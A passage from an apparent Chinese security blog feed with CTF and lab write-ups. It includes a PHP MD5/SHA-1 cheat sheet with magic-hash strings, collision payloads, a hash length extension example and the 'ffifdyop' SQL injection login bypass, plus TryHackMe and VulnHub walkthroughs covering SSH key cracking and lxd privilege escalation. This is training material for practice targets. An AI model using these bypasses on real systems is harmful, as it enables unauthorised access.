    <content type="html"><![CDATA[<h1 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较&#x3D;&#x3D;"></a>弱类型比较&#x3D;&#x3D;</h1><p>0e开头绕过即可<br>QNKCDZO0e830400451993494058024219903391<br>2406107080e462097431906509019562988736854<br>s878926199a0e545993274517709034328855841020<br>s155964671a0e342768416822451524974117254469<br>s214587387a0e848240448830537924465865611904<br>s214587387a0e848240448830537924465865611904<br>s878926199a0e545993274517709034328855841020<br>s1091221200a0e940624217856561557816327384675<br>s1885207154a0e509367213418206700842008763514<br>s1502113478a0e861580163291561247404381396064</p><h1 id="强类型比较"><a href="#强类型比较" class="headerlink" title="强类型比较&#x3D;&#x3D;&#x3D;"></a>强类型比较&#x3D;&#x3D;&#x3D;</h1><p>数组绕过[]<br>如果string了，就用下面这两个<br>MD5<br><code>array1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;array2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code><br>SHA1</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">array<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-variable">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%25</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%E3</span><span class="hljs-variable">%CF</span><span class="hljs-variable">%D3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-number">1</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>obj<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>C/Width<span class="hljs-variable">%202</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Height<span class="hljs-variable">%203</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Type<span class="hljs-variable">%204</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Subtype<span class="hljs-variable">%205</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Filter<span class="hljs-variable">%206</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/ColorSpace<span class="hljs-variable">%207</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Length<span class="hljs-variable">%208</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/BitsPerComponent<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>Astream<span class="hljs-variable">%0</span>A<span class="hljs-variable">%FF</span><span class="hljs-variable">%D8</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%00</span><span class="hljs-variable">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>dead<span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%85</span>/<span class="hljs-variable">%EC</span><span class="hljs-variable">%09</span><span class="hljs-variable">%239</span>u<span class="hljs-variable">%9</span>C<span class="hljs-number">9</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%A1</span><span class="hljs-variable">%C6</span><span class="hljs-variable">%3</span>CL<span class="hljs-variable">%97</span><span class="hljs-variable">%E1</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%01</span><span class="hljs-variable">%7</span>FF<span class="hljs-variable">%DC</span><span class="hljs-variable">%93</span><span class="hljs-variable">%A6</span><span class="hljs-variable">%B6</span><span class="hljs-variable">%7</span>E<span class="hljs-variable">%01</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%02</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%AA</span><span class="hljs-variable">%1</span>D<span class="hljs-variable">%B2V</span><span class="hljs-variable">%0</span>BE<span class="hljs-variable">%CAg</span><span class="hljs-variable">%D6</span><span class="hljs-variable">%88</span><span class="hljs-variable">%C7</span><span class="hljs-variable">%F8K</span><span class="hljs-variable">%8</span>CLy<span class="hljs-variable">%1</span>F<span class="hljs-variable">%E0</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%3</span>D<span class="hljs-variable">%F6</span><span class="hljs-variable">%14</span><span class="hljs-variable">%F8m</span><span class="hljs-variable">%B1i</span><span class="hljs-variable">%09</span><span class="hljs-variable">%01</span><span class="hljs-variable">%C5kE</span><span class="hljs-variable">%C1S</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%FE</span><span class="hljs-variable">%DF</span><span class="hljs-variable">%B7</span><span class="hljs-variable">%608</span><span class="hljs-variable">%E9rr</span>/<span class="hljs-variable">%E7</span><span class="hljs-variable">%ADr</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%0</span>EI<span class="hljs-variable">%04</span><span class="hljs-variable">%E0F</span><span class="hljs-variable">%C20W</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%E9</span><span class="hljs-variable">%D4</span><span class="hljs-variable">%13</span><span class="hljs-variable">%98</span><span class="hljs-variable">%AB</span><span class="hljs-variable">%E1.</span><span class="hljs-variable">%F5</span><span class="hljs-variable">%BC</span><span class="hljs-variable">%94</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%E35B</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%80</span>-<span class="hljs-variable">%98</span><span class="hljs-variable">%B5</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%2</span>A<span class="hljs-number">3</span>.<span class="hljs-variable">%C3</span><span class="hljs-variable">%7</span>F<span class="hljs-variable">%AC5</span><span class="hljs-variable">%14</span><span class="hljs-variable">%E7M</span><span class="hljs-variable">%DC</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%2</span>C<span class="hljs-variable">%C1</span><span class="hljs-variable">%A8t</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%0</span>Cx<span class="hljs-number">0</span>Z<span class="hljs-variable">%21</span>Vda<span class="hljs-number">0</span><span class="hljs-variable">%97</span><span class="hljs-variable">%89</span><span class="hljs-variable">%60</span>k<span class="hljs-variable">%D0</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%3</span>F<span class="hljs-variable">%98</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%04</span>F<span class="hljs-variable">%29</span><span class="hljs-variable">%A1</span><br>&amp;array<span class="hljs-number">2</span><span class="hljs-operator">=</span><span class="hljs-variable">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%25</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%E3</span><span class="hljs-variable">%CF</span><span class="hljs-variable">%D3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-number">1</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>obj<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>C/Width<span class="hljs-variable">%202</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Height<span class="hljs-variable">%203</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Type<span class="hljs-variable">%204</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Subtype<span class="hljs-variable">%205</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Filter<span class="hljs-variable">%206</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/ColorSpace<span class="hljs-variable">%207</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Length<span class="hljs-variable">%208</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/BitsPerComponent<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>Astream<span class="hljs-variable">%0</span>A<span class="hljs-variable">%FF</span><span class="hljs-variable">%D8</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%00</span><span class="hljs-variable">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>dead<span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%85</span>/<span class="hljs-variable">%EC</span><span class="hljs-variable">%09</span><span class="hljs-variable">%239</span>u<span class="hljs-variable">%9</span>C<span class="hljs-number">9</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%A1</span><span class="hljs-variable">%C6</span><span class="hljs-variable">%3</span>CL<span class="hljs-variable">%97</span><span class="hljs-variable">%E1</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%01</span>sF<span class="hljs-variable">%DC</span><span class="hljs-variable">%91</span>f<span class="hljs-variable">%B6</span><span class="hljs-variable">%7</span>E<span class="hljs-variable">%11</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%02</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%B6</span><span class="hljs-variable">%21</span><span class="hljs-variable">%B2V</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%F9</span><span class="hljs-variable">%CAg</span><span class="hljs-variable">%CC</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%C7</span><span class="hljs-variable">%F8</span><span class="hljs-variable">%5</span>B<span class="hljs-variable">%A8Ly</span><span class="hljs-variable">%03</span><span class="hljs-variable">%0</span>C<span class="hljs-variable">%2</span>B<span class="hljs-variable">%3</span>D<span class="hljs-variable">%E2</span><span class="hljs-variable">%18</span><span class="hljs-variable">%F8m</span><span class="hljs-variable">%B3</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%09</span><span class="hljs-variable">%01</span><span class="hljs-variable">%D5</span><span class="hljs-variable">%DFE</span><span class="hljs-variable">%C1O</span><span class="hljs-variable">%26</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%DF</span><span class="hljs-variable">%B3</span><span class="hljs-variable">%DC8</span><span class="hljs-variable">%E9j</span><span class="hljs-variable">%C2</span>/<span class="hljs-variable">%E7</span><span class="hljs-variable">%BDr</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%0</span>EE<span class="hljs-variable">%BC</span><span class="hljs-variable">%E0F</span><span class="hljs-variable">%D2</span><span class="hljs-variable">%3</span>CW<span class="hljs-variable">%0</span>F<span class="hljs-variable">%EB</span><span class="hljs-variable">%14</span><span class="hljs-variable">%13</span><span class="hljs-variable">%98</span><span class="hljs-variable">%BBU.</span><span class="hljs-variable">%F5</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%E31</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%807</span><span class="hljs-variable">%B8</span><span class="hljs-variable">%B5</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%1</span>F<span class="hljs-variable">%0</span>E<span class="hljs-number">3</span>.<span class="hljs-variable">%DF</span><span class="hljs-variable">%93</span><span class="hljs-variable">%AC5</span><span class="hljs-variable">%00</span><span class="hljs-variable">%EBM</span><span class="hljs-variable">%DC</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%EC</span><span class="hljs-variable">%C1</span><span class="hljs-variable">%A8dy</span><span class="hljs-variable">%0</span>Cx<span class="hljs-variable">%2</span>Cv<span class="hljs-variable">%21</span>V<span class="hljs-variable">%60</span><span class="hljs-variable">%DD0</span><span class="hljs-variable">%97</span><span class="hljs-variable">%91</span><span class="hljs-variable">%D0k</span><span class="hljs-variable">%D0</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%3</span>F<span class="hljs-variable">%98</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%BCF</span><span class="hljs-variable">%29</span><span class="hljs-variable">%B1</span><br></code></pre></td></tr></table></figure><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>fastcoll<br><a href="http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip" title="http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip">http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip</a></p><h2 id="例题（qsnctf中的easymd5）"><a href="#例题（qsnctf中的easymd5）" class="headerlink" title="例题（qsnctf中的easymd5）"></a>例题（qsnctf中的easymd5）</h2><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408251904953.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408251912750.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408251914075.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408251907791.png" alt="image.png"></p><h1 id="哈希长度拓展攻击"><a href="#哈希长度拓展攻击" class="headerlink" title="哈希长度拓展攻击"></a>哈希长度拓展攻击</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><h2 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h2><p><a href="https://github.com/shellfeel/hash-ext-attack">shellfeel&#x2F;hash-ext-attack: 哈希长度扩展攻击利用脚本，免去了hashpump需要编译的烦恼 (github.com)</a></p><h2 id="例题（改自BaseCTF）"><a href="#例题（改自BaseCTF）" class="headerlink" title="例题（改自BaseCTF）"></a>例题（改自BaseCTF）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-title function_ invoke__">session_start</span>();  <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);  <br><span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>])) &#123;    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>] = <span class="hljs-number">123456</span>;  <br>&#125;  <br>  <br><span class="hljs-comment">// 你想看到 random 的值吗?  </span><br><span class="hljs-comment">// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧  </span><br><span class="hljs-variable">$random </span>= <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>];  <br><span class="hljs-keyword">echo</span><span class="hljs-title function_ invoke__"> md5</span>(<span class="hljs-variable">$random</span>);  <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;  <br>  <br><span class="hljs-variable">$name </span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>] ?? <span class="hljs-string">&#x27;user&#x27;</span>;  <br>  <br><span class="hljs-comment">// check if name ends with &#x27;admin&#x27;  </span><br><span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, -<span class="hljs-number">5</span>) !== <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;  <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;不是管理员也来凑热闹?&#x27;</span>);  <br>&#125;  <br>  <br><span class="hljs-variable">$md5 </span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];  <br><span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$random </span>. <span class="hljs-variable">$name</span>) !== <span class="hljs-variable">$md5</span>) &#123;  <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;伪造? NO NO NO!&#x27;</span>);  <br>&#125;  <br>  <br><span class="hljs-comment">// 认输了, 看样子你真的很懂 MD5  </span><br><span class="hljs-comment">// 那 flag 就给你吧  </span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;看样子你真的很懂 MD5&quot;</span>;  <br><span class="hljs-keyword">echo</span><span class="hljs-title function_ invoke__"> file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408251603217.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408251606992.png" alt="image.png"><br>这里注意md5最后面有个&amp;不然可能识别错误，不出flag，或者就用BP，yakit抓包</p><h1 id="sql注入中的md5"><a href="#sql注入中的md5" class="headerlink" title="sql注入中的md5"></a>sql注入中的md5</h1><p>select * from ‘admin’ where password&#x3D;md5($pass,true)</p><p>这里面password就是我们用户框中输入得东西。如果通过md5之后返回字符串是’or 1的话，形成一个永真条件，</p><p>select * from ‘admin’ where password&#x3D;’ ‘or ‘6…’</p><p>看了大佬博客，这个可以用ffifdyop绕过，绕过原理是： ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6 而 Mysql 刚好又会把 hex 转成 ascii 解释，因此拼接之后的形式是 select * from ‘admin’ where password&#x3D;’’ or ‘6xxxxx’，等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数。</p>]]></content>
    
    
    <categories>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重生之我在try hack me打靶，励志成为赛博高手-DAY10-GamingServer</title>
    <link href="/2024/08/12/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY10-GamingServer/"/>
    <url>/2024/08/12/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY10-GamingServer/</url>
    
    <content type="html"><![CDATA[<h1 id="重生之我在try-hack-me打靶，励志成为赛博高手-DAY10-GamingServer"><a href="#重生之我在try-hack-me打靶，励志成为赛博高手-DAY10-GamingServer" class="headerlink" title="重生之我在try hack me打靶，励志成为赛博高手-DAY10-GamingServer"></a>重生之我在try hack me打靶，励志成为赛博高手-DAY10-GamingServer</h1><p><a href="https://tryhackme.com/r/room/gamingserver">尝试黑客 |游戏服务器 — TryHackMe | GamingServer</a></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111504753.png" alt="image-20240403095504539"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111504965.png" alt="image-20240403095810994"></p><p>这个secret一看就很吸引人，先看看这个</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111505116.png" alt="image-20240403221213821"></p><p>打开有一个文件</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111505119.png" alt="image-20240403221230856"></p><p>一个rsa的key</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111505684.png" alt="image-20240403221449371"></p><p>ssh2john破解下</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111505762.png" alt="image-20240403221714092"></p><p>轻松得到key: letmein</p><p>现在只需要再找到用户名我们就可以通过ssh直接进入</p><p>我们继续看看刚才扫到的别的目录</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111505009.png" alt="image-20240403221923403"></p><p>robots.txt指向的也是uploads</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111505909.png" alt="image-20240403222005540"></p><p>dict.lst</p><p>里面疑似一些密码的字典</p><p>manifesto.txt很长而且全英，这里附上翻译，有兴趣的看（就是个背景故事）</p><p>黑客宣言<br>通过<br>+++导师+++<br>写于1986年1月8日<br>今天又有一个被抓了，报纸上到处都是。“青少年因电脑犯罪被捕丑闻”，“黑客因银行篡改被捕”。。。<br>该死的孩子们。他们都很像。<br>但是，在你的三件套心理学和20世纪50年代的技术大脑中，你有没有回头看看<br>黑客的眼睛？你有没有想过是什么让他振作起来，是什么力量塑造了他，<br>是什么塑造了他？<br>我是一个黑客，进入我的世界。。。<br>我的世界是从学校开始的。。。我比大多数其他孩子都聪明，这些垃圾<br>他们教我们无聊。。。<br>该死的后进生。他们都很像。<br>我在读初中或高中。我第十五次听老师讲解了<br>如何减少一个分数。我理解。”不，史密斯女士，我没有展示我的作品。我展示了<br>在我的脑海里。。。”<br>该死的孩子。可能是抄袭的。他们都很像。<br>我今天有个发现。我找到了一台电脑。等一下，这很酷。它做什么我<br>如果它犯了错误，那是因为我把它搞砸了。不是因为它不喜欢<br>我…或者感觉受到了我的威胁…或者认为我是个聪明的混蛋。或者不喜欢教书<br>不应该在这里。。。<br>该死的孩子。他所做的只是玩游戏。他们都很像。<br>然后事情发生了。。。一扇通向世界的门。。。像海洛因一样冲过电话线<br>通过瘾君子的静脉，发出电子脉冲，成为日常生活的避难所<br>寻求无能。。。发现了一块木板。“就是这样……这就是我的归属……”我知道<br>这里的每个人。。。即使我从未见过他们，从未与他们交谈，也可能从未收到他们的消息<br>再一次我认识你们所有人。。。<br>该死的孩子。再次系上电话线。他们都很像。。。<br>你敢打赌，我们都一样。。。我们饿的时候在学校被人用勺子喂婴儿食品<br>牛排。。。你漏出来的那些肉都是预先咀嚼过的，没有味道。<br>我们被虐待狂支配，或者被冷漠的人忽视。少数几个有事情要做<br>teach为我们找到了心甘情愿的学生，但那些少数人就像沙漠中的一滴水。<br>这就是我们现在的世界。。。电子和开关的世界，波特的美丽。我们<br>使用已经存在的服务，而不必支付非常便宜的费用<br>不是由贪图暴利的人经营的，你还称我们为罪犯。我们探索。。。然后你打电话给我们<br>罪犯。我们追求知识。。。你还称我们为罪犯。我们的存在没有肤色，<br>没有国籍，没有宗教偏见。。。你还称我们为罪犯。你建造原子<br>炸弹，你发动战争，你谋杀，欺骗，对我们撒谎，试图让我们相信这是为了<br>我们自己好，但我们是罪犯。<br>是的，我是个罪犯。我的罪行是好奇。我的罪行是以貌取人<br>他们说什么和想什么，而不是他们长什么样。我的罪行是比你聪明，<br>一些你永远不会原谅我的事情。<br>我是一个黑客，这是我的宣言。你可以阻止这个人，但你无法阻止我们<br>全部的毕竟，我们都是一样的。</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111505368.png" alt="image-20240403222551482"></p><p>然后还有这张图片</p><p>那其实可以看到我们可能利用的就只有dict.lst</p><p>hydra爆破不出来，这是我们怀疑之前是不是有什么线索没找到，重新回到网站进行观察</p><p>他这个网站页面甚至不是英语，一时半会儿完全看不出来，但是打开源代码立刻看到线索</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111505829.png" alt="image-20240403223117643"></p><p>john</p><p>直接试下</p><p>记得chmod，不然连不上</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111505750.png" alt="image-20240403225128296"></p><p>（我一开始就是忘了chmod，一直报错一直报错，我实在受不了就去搜wp，他们也没写chmod的过程，我看他们文件名都叫secretKey，于是我以为名字也要一样，试了很多次，所以上面与前面有些许冲突）</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111505246.png" alt="image-20240403225321505"></p><p>拿到第一个标志，接下来就是提权</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111505747.png" alt="image-20240403225503828"></p><p>sudo -l</p><p>发现要密码letmein又不对</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111505767.png" alt="image-20240403225610493"></p><p>查看id</p><p><a href="https://blog.csdn.net/YouthBelief/article/details/123548739">linux lxd组用户提权至root_lxd是什么用户-CSDN博客</a></p><p>找到个提权的办法</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111505681.png" alt="image-20240403225852012"></p><p>东西也都在</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111505502.png" alt="image-20240403230020853"></p><p>可以看到，我报错了（我的解决办法就是等一等或者再试一次，反正最后成功了）</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111505892.png" alt="image-20240403231007205"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111505600.png" alt="image-20240403231017956"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111505194.png" alt="image-20240403231252516"></p><p>基本上就是跟着刚才的链接复制黏贴</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111505281.png" alt="image-20240403231322089"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111505800.png" alt="image-20240403231453306"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111505282.png" alt="image-20240403231531460"></p><p>完成</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408111505947.png" alt="image-20240403231548493"></p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub靶场-Lampiao</title>
    <link href="/2024/08/11/vulnhub%E9%9D%B6%E5%9C%BA-Lampiao/"/>
    <url>/2024/08/11/vulnhub%E9%9D%B6%E5%9C%BA-Lampiao/</url>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>老规矩，端口扫描<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408102053082.png" alt="image.png"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408102054455.png" alt="image.png"><br>这里可以看到开放了两个http服务，80这个finger一下子看不出是什么东西，但是从80看到目录有信息泄露，还有apache版本，以及drupal这个有历史漏洞的cms，相较于80，我认为1898是突破口的可能性更大<br>但还是先看看80<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408102059457.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408102100783.png" alt="image.png"><br>不是很理解他的意思，还是去看1898吧<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408102101896.png" alt="image.png"><br>可以看到有一个用户名tiago，先就这个页面试试功能点，弱口令登录试了下都不对，，点击一下别的页面<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408102108163.png" alt="image.png"><br>可以看到这个目录下有一个m4a跟一个png，访问一下看看<br>m4a播放的内容是user tiago<br>qrc.png则是一个二维码<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408102110509.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408102111007.png" alt="image.png"><br>扫出来这个，没什么意义<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408102111514.png" alt="image.png"><br>又一个mp3，再听听看，似乎就真的是一段音乐<br>进行目录扫描<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408102103040.png" alt="image.png"><br>可以发现扫出来的东西有点多，先看看robots.txt吧<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408102117157.png" alt="image.png"><br>allow的东西肯定是我们不关注的，这个disallow的才是重点，但是这里的东西也跟我们目录扫描出的东西差不多，这里我们选择访问&#x2F;CHANGELOG.txt，在log里可能有敏感信息泄露<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408102132552.png" 